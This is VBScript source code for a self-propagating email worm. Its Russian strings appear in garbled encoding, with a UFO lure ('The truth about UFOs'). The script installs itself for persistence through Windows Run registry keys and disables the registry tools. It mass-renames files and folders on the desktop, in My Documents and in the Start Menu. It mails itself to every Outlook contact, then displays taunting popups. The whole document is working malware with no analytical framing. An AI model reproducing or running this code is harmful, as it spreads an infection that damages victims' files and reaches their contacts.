   Set f = CreateObject("scripting.filesystemobject")
   Set s = CreateObject("Wscript.Shell")
   t=0: on error resume next
   Set os = CreateObject("Shell.Application")
   set ie = WScript.CreateObject("InternetExplorer.Application")
   Set oe = WScript.CreateObject("Outlook.Application")

   Set File2 = f.GetFile(WScript.ScriptFullName)
   File2.Copy ("c:\windows\System\Gigabyte.vbs")
   s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigab yte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
   s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServic es\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

   s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\S YSTEM\DisableRegistryTools", 1, "REG_DWORD"

   For Each Folder In s.SpecialFolders
   if right(folder,12)="Ðàáî÷èé ñòîë" then
   set tf=f.getfolder(folder)
   set af=tf.files
   For Each fl In af
   set file=f.getfile(fl):t=t+1
   file.name="Ïðèøåëüöû óæå òóò" & t
   next
   end if
   next


   For Each Folder In s.SpecialFolders
   if right(folder,13)="Ìîè äîêóìåíòû" then
   set tf=f.getfolder(folder)
   set af=tf.files
   For Each fl In af
   set file=f.getfile(fl):t=t+1
   file.name="Ïðèøåëüöû óæå òóò" & t
   next
   end if
   next

   For Each Folder In s.SpecialFolders
   if right(folder,13)="Ìîè äîêóìåíòû" then
   set tf=f.getfolder(folder): tf.name="Ïðèøåëüöû óæå òóò"
   End if
   next


   For Each Folder In s.SpecialFolders
   if right(folder,12)="Ãëàâíîå ìåíþ" then
   set tf=f.getfolder(folder)
   set af=tf.subfolders
   For Each fl In af
   set file=f.getfolder(fl):t=t+1
   file.name="Ïðèøåëüöû óæå òóò" & t
   next
   end if
   next


   For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
   Set OutMail = oe.CreateItem(0)
   OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
   OutMail.Subject = "Ïðàâäà îá ÍËÎ"
   OutMail.Body = "Ïðèøåëüöû çäåñü! Â ïèñüìå äîêàçàòåëüñòâà!"
   OutMail.Attachments.Add WScript.ScriptFullName
   OutMail.Send
   Next


   s.popup "Âíèìàíèå! Ýòîò ôàéë äîêàçûâàåò ñóùåñòâîâàíèå âíåçåìíîé öèâèëèçàöèè", , "Äîêàçàòåëüñòâà", 0+48

   s.popup "×åðåç íåêîòîðîå âðåìÿ Âû ñàìè ýòî ïîéìåòå!", , "Äîêàçàòåëüñòâà", 0+48

   s.popup "À êàê ïî Âàøåìó, ïî÷åìó ïðèøåëüöû ñóùåñòâóþò?", , "Äîêàçàòåëüñòâà", 0+48

   s.popup "Ìîæåò áûòü ïîòîìó, ÷òî Âñåëåííàÿ áåçãðàíè÷íà?", , "Äîêàçàòåëüñòâà", 0+48

   s.popup "Âû ïîêà íè÷åãî íå ïîíÿëè? Íè÷åãî ñêîðî ïîéìåòå... Ãû...", , "Äîêàçàòåëüñòâà", 0+48
